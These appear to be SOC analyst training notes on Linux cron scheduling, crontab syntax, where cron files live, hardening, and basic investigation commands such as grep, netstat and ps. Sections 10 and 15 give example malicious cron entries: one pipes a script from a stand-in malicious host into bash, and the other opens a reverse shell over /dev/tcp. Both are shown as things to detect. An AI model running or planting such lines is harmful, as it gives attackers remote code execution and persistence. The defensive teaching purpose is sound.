# SOC Analyst L1 — Class 24
# Linux Crontab & Linux Basic Commands

---

# 1. Linux Crontab

## What is Cron?

- Cron is a Linux task scheduler.
- It runs commands automatically at scheduled times.
- In Linux, cron is like the **"alarm clock" of the system**.
- It is a time-based job scheduler.
- It allows scripts or commands to run automatically at specific intervals.

## Cron from a SOC Analyst Perspective

Cron is a **double-edged sword**:

- It is an essential tool for:
  - Automation
  - Health monitoring
- It is also one of the common places where attackers hide:
  - Persistence mechanisms

---

# 2. Task Scheduling in Linux

Linux task scheduling includes:

## One-Time Execution

### AT Command

- Used for one-time execution.
- Does not support recurring tasks.

### Limitation

- Cannot be used for recurring tasks.

---

## Recurring Execution

### Cron

- Used for recurring execution.

### Anacron

- Handles missed jobs.

### Cron Limitation

- Cron fails if the system is off when the scheduled job should run.

### Root Privileges

- Some cron tasks require root privileges.

---

# 3. Crontab

## What is Crontab?

- Crontab means **Cron Table**.
- It is the configuration file where schedules are defined.
- Each line in a crontab follows a specific **5-field syntax**.
- The five fields represent time.
- The command to execute comes after the five time fields.

Basic format:

    * * * * * command_to_execute

---

# 4. The Five Stars of Cron

| Field | Range | Description |
|---|---|---|
| Minute (1) | 0–59 | Exact minute the task starts |
| Hour (2) | 0–23 | Hour in 24-hour format |
| Day of Month (3) | 1–31 | Calendar day |
| Month (4) | 1–12 | 1 = January, 12 = December |
| Day of Week (5) | 0–6 | 0 = Sunday, 6 = Saturday |

Cron format:

    Minute Hour Day_of_Month Month Day_of_Week Command

---

# 5. Special Operators

## `*` — Asterisk

- Means every possible value.

Example:

    *

Meaning:

- Every possible value.

Example from the PDF:

    * * * * *

- Every minute.

---

## `,` — Comma

- Used for multiple discrete values.

Example:

    1,15,30

Meaning:

- Minute 1
- Minute 15
- Minute 30

---

## `-` — Hyphen

- Used for a range of values.

Example:

    1-5

The PDF gives the example:

- 1–5 in the day field for Mon–Fri.

---

## `/` — Slash

- Used for increments.

Example:

    */10

In the minute field:

    */10 * * * *

Meaning:

- Every 10 minutes.

---

# 6. Crontab Commands

## Edit Crontab

    crontab -e

- Used to edit the crontab.

---

## View Crontab

    crontab -l

- Used to see the contents of the user crontab.

---

# 7. Practical Examples

## Backup a Directory Every Night at 2:30 AM

    30 02 * * * tar -zcf /backups/home.tgz /home/user/

Meaning:

- Runs at 2:30 AM.
- Creates a compressed backup of `/home/user/`.

---

## Run a Security Scan Every Sunday at Midnight

    0 0 * * 0 /usr/local/bin/lynis scan system

Meaning:

- Runs at midnight.
- Runs every Sunday.
- Executes the security scan.

---

## Clean Up `/tmp` Logs Every 15 Minutes

    */15 * * * * rm /tmp/*.log

Meaning:

- Runs every 15 minutes.
- Removes `.log` files from `/tmp/`.

---

# 8. Where Cron Lives

A SOC Analyst needs to know where cron files are located during an investigation.

## User Crontabs

Location:

    /var/spool/cron/crontabs/

- These are user crontabs.
- They are managed by the `crontab` command.

---

## System Crontabs

Locations:

    /etc/crontab
    /etc/cron.d/

- These are system crontabs.
- They usually require root privileges.
- They include an extra field for the username running the command.

---

# 9. Periodic Folders

Periodic cron folders include:

    /etc/cron.daily/
    /etc/cron.hourly/
    /etc/cron.monthly/

---

# 10. Why Cron Matters for SOC L1 Analysts

## A. Detecting Persistence — The "Evil" Cron

Attackers can create a cron job to make sure their malware restarts even if the server reboots.

### Scenario

You see:

- A weird outbound connection.
- The connection goes to a C2 (Command & Control) server.
- The connection happens every hour at the same time.

### Investigation

Check all crontabs.

You might find:

    0 * * * * curl http://malicious-site.com/shell.sh | bash

This scheduled command runs every hour.

---

# 11. Automating Defensive Tasks

SOC L1 Analysts can also use cron for defensive tasks.

## Log Rotation

- Ensures logs do not fill the disk.
- Helps prevent the SIEM agent from crashing because of a full disk.

---

## Automated Health Checks

Cron can send an alert if a critical security service stops running.

Examples given in the PDF:

- `auditd`
- `fail2ban`

---

## Snapshotting

- Regularly export a list of running processes to a file.
- This can be used for baseline comparison.

---

# 12. Log Analysis — Cron Logs

During an incident investigation, check:

    /var/log/syslog

or:

    /var/log/cron

These logs can show which jobs were executed.

## Red Flag

A job:

- Running under the `www-data` user
- Executing a script from `/tmp/`

This is a red flag that should be investigated.

---

# 13. Security Best Practices — Cron Hardening

## `/etc/cron.allow`

- Only users listed in this file can use cron.

---

## `/etc/cron.deny`

- Users listed in this file are blocked from using cron.

---

## Important SOC Tip

If `/etc/cron.allow` exists:

- Linux ignores `/etc/cron.deny`.

If neither exists:

- Depending on the distribution:
  - Everyone may be allowed to use cron
  - Or only root may be allowed

---

# 14. SOC Threats — Persistence

Attackers can use cron for persistence.

Example:

    */10 * * * * malware.sh

Meaning:

- Run `malware.sh` every 10 minutes.
- It executes every 10 minutes continuously.

### Result

- Malware executes every 10 minutes.
- The scheduled job provides persistence.

---

# 15. Reverse Shell Persistence

Cron can also be used for reverse shell persistence.

Example:

    * * * * * bash -i >& /dev/tcp/IP/4444

Meaning:

Every minute:

1. Launch Bash shell.
2. Connect to the attacker IP.
3. Give remote command execution.

---

# 16. Real SOC Scenario

The PDF shows this attack flow:

    SSH compromise
          ↓
    Cron job added
          ↓
    Persistent reverse shell

---

# 17. Final SOC Mindset

When analyzing Linux:

## Don't ask only:

    "What command ran?"

## Ask:

    Why was it used?

    What was attacker trying to achieve?

    What changed after execution?

---

# 18. Linux Basic Commands

The PDF contains a:

**Linux Commands Cheat Sheet for SOC L1 Analysts**

The commands shown are:

- `grep`
- `netstat`
- `ps`
- `top`
- `chmod`
- `chown`
- `tail`
- `ls`
- `cd`
- `cat`
- `less`
- `df`
- `free`
- `who`
- `history`
- `find`
- `du`

---

# 19. grep

## Purpose

- Search text patterns in files.

## Syntax

    grep [options] "pattern" filename

## Example

    grep "failed password" /var/log/auth.log

## Common Options

- `-i` — Ignore case
- `-v` — Show non-matching lines
- `-n` — Show line numbers
- `-r` — Recursive search
- `-A` — Show lines after the match

## SOC Use Cases

- Search for failed logins.
- Search for suspicious IPs or keywords.
- Quickly filter log files.

---

# 20. netstat

## Purpose

Displays:

- Network connections
- Listening ports
- Network statistics

## Syntax

    netstat [options]

## Example

    netstat -antp

## Common Options

- `-a` — Show all connections/ports
- `-n` — Show numeric addresses/ports
- `-t` — Show TCP connections
- `-u` — Show UDP connections
- `-p` — Show process using the connection
- `-l` — Show listening ports only

## SOC Use Cases

- Detect reverse shells.
- Investigate suspicious outbound connections.
- Discover open/listening ports.

---

# 21. ps

## Purpose

- Reports a snapshot of current processes.

## Syntax

    ps [options]

## Example

    ps aux

## Common Options

- `a` — Show processes for all users
- `u` — Display user information
- `x` — Include processes without a controlling terminal
- `f` — Full-format listing

## SOC Use Cases

- Identify suspicious processes.
- Check process activity.
- Check processes running as root.

---

# 22. top

## Purpose

- Provides a real-time view of processes and resource usage.

## Command

    top

## Information Shown

- `%CPU` — CPU usage
- `%MEM` — Memory usage
- `LOAD` — System load average
- `PID` — Process ID
- `COMMAND` — Running process

## SOC Use Cases

- Monitor high CPU usage.
- Monitor high memory usage.
- Detect resource-hungry processes.
- Observe possible crypto-mining activity.
- Monitor system performance.

---

# 23. chmod

## Purpose

- Change file permissions.

## Syntax

    chmod [permissions] filename

## Example

    chmod 755 script.sh

## Permission Values

    r = 4
    w = 2
    x = 1

Examples:

    7 = rwx
    6 = rw-
    5 = r-x
    0 = ---

## SOC Use Cases

- Restrict or allow file execution.
- Harden system permissions.
- Detect unauthorized permission changes.

---

# 24. chown

## Purpose

- Change file/directory ownership.

## Syntax

    chown [user]:[group] filename

## Example

    chown root:root file.txt

## SOC Use Cases

- Fix incorrect ownership.
- Detect ownership changes.
- Audit sensitive directory access.

---

# 25. tail

## Purpose

- Displays the last part of a file.

## Syntax

    tail [options] filename

## Example

    tail -f /var/log/auth.log

## Common Options

- `-n 20` — Show last 20 lines
- `-f` — Follow live log output
- `-F` — Continue following when the file is recreated

## SOC Use Cases

- Monitor logs in real time.
- Track live attacks/login attempts.
- Quickly view recent events.

---

# 26. ls

## Purpose

- List files and directories.

## Syntax

    ls [options] [path]

## Example

    ls -lah /var/log

## SOC Use

- View files.
- Check permissions.
- Check ownership.
- Check timestamps.

---

# 27. cd

## Purpose

- Change directory.

## Syntax

    cd [path]

## Example

    cd /var/log

---

# 28. cat

## Purpose

- Display file content.

## Syntax

    cat filename

## Example

    cat /etc/passwd

---

# 29. less

## Purpose

- View file content page by page.

## Syntax

    less filename

## Example

    less /var/log/syslog

## SOC Use

- View large log files.

---

# 30. df

## Purpose

- Display disk-space usage.

## Syntax

    df -h

## SOC Use

- Check disk usage.
- Investigate storage problems.

---

# 31. free

## Purpose

- Display memory usage.

## Syntax

    free -m

## SOC Use

- Check RAM usage.
- Investigate unusual memory consumption.

---

# 32. who

## Purpose

- Show currently logged-in users.

## Syntax

    who

## SOC Use

- See currently logged-in users.
- Investigate unexpected user sessions.

---

# 33. history

## Purpose

- Display command history.

## Syntax

    history

## SOC Use

- Review executed commands.
- Investigate activity.

---

# 34. find

## Purpose

- Search files and directories.

## Syntax

    find [path] -name "file"

## Example

    find / -name suspicious.sh

## SOC Use Cases

- Find suspicious files.
- Search for hidden files.
- Locate potentially malicious scripts.

---

# 35. du

## Purpose

- Display directory size/usage.

## Syntax

    du -sh [path]

## Example

    du -sh /var/log

## SOC Use

- Check directory size.
- Investigate unusual disk usage.

---

# 36. Important Log Paths

The Linux command cheat sheet shows these important paths:

| Path | Purpose |
|---|---|
| `/var/log/auth.log` | Authentication logs |
| `/var/log/syslog` | System logs |
| `/var/log/kern.log` | Kernel logs |
| `/var/log/dpkg.log` | Package install logs |
| `/var/log/secure` | RHEL/CentOS authentication logs |
| `/var/log/messages` | General system logs |
| `/var/log/apache2/` | Apache web logs |
| `/var/log/nginx/` | Nginx web logs |

---

# 37. Tips for SOC L1 Analysts

The PDF's cheat sheet gives these tips:

- Always check logs first:
  
      /var/log/

- Use `grep` + `tail` for quick investigation.
- Combine `ps` + `netstat` to find suspicious activity.
- Monitor resource usage with `top`.
- Always validate before making changes.
- Document findings and escalate if needed.

---

# 38. Important Takeaway

The commands in the cheat sheet are described as the:

**first line of defense**

They are used to:

- Detect
- Investigate
- Respond
- Monitor

The PDF also emphasizes:

- Practice regularly.
- Speed comes with experience.

---
